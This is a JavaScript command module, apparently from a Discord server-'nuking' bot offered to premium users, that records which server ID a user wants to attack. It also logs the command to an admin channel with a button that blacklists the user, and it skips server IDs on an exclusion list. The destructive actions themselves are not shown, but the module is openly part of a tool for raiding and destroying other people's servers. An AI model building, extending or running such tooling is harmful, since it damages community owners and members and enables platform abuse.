const { ButtonBuilder, ButtonStyle, ActionRowBuilder, ComponentType } = require('discord.js');
const fs = require('fs');

module.exports = {
    name: 'use.guild',
    description: 'Sets the guild to nuke for a premium user.',
    prefix: '#',
    premium: true,
    async execute(msg, args, client, channel_logs, blacklist_user, idservidores_nopermitidos, config_usuarios_premium) {
        try {
            const blacklist_pecausa = new ButtonBuilder()
                .setCustomId('xdxd')
                .setLabel('Blacklist User')
                .setStyle(ButtonStyle.Danger);
            const equisde = new ActionRowBuilder()
                .addComponents(blacklist_pecausa);
            const msgxd = await client.channels.cache.get(channel_logs).send({ components: [equisde], content: `Command **use.guild** executed by **${msg.author.username}** (${msg.author.id}) in **${msg.guild.name}** (${msg.guild.id})` });
            const colector = msgxd.createMessageComponentCollector({
                componentType: ComponentType.Button,
                time: 30_000
            });
            colector.on(`collect`, (int) => {
                if (int.customId === "xdxd") {
                    blacklist_user.push(msg.author.id);
                    let blacklist_users_json = fs.readFileSync("blacklist_users.json", 'utf-8');
                    let ae = JSON.parse(blacklist_users_json);
                    let xdxd = JSON.stringify(ae);
                    let xd = xdxd.replace("]", "");
                    let asd = `${xd}\n,{"id":"${msg.author.id}"}]`;
                    fs.writeFileSync('blacklist_users.json', asd);
                    int.reply({ content: `> Usuario en blacklist.` });
                    return;
                };
            });
        } catch (e) {
            console.log(e.message);
        };
        if (idservidores_nopermitidos.includes(args[0])) {
            await msg.channel.send({ content: `> Ese servidor no está permitido.` });
            return;
        };
        if (args.length === 0) {
            await msg.channel.send({ content: `> Falta agregar la ID del servidor a atacar.` });
            return;
        };
        if (!config_usuarios_premium[msg.author.id]) {
            config_usuarios_premium[msg.author.id] = {
                guild_id: args[0]
            };
            await msg.channel.send({ content: `> Se agregó el ID del servidor a atacar.` });
        } else {
            config_usuarios_premium[msg.author.id].guild_id = args[0];
            await msg.channel.send({ content: `> Se editó el ID del servidor a atacar.` });
        };
        let ae = JSON.stringify(config_usuarios_premium);
        fs.writeFileSync('config_premium_users.json', ae);
        console.log(config_usuarios_premium);
    }
};
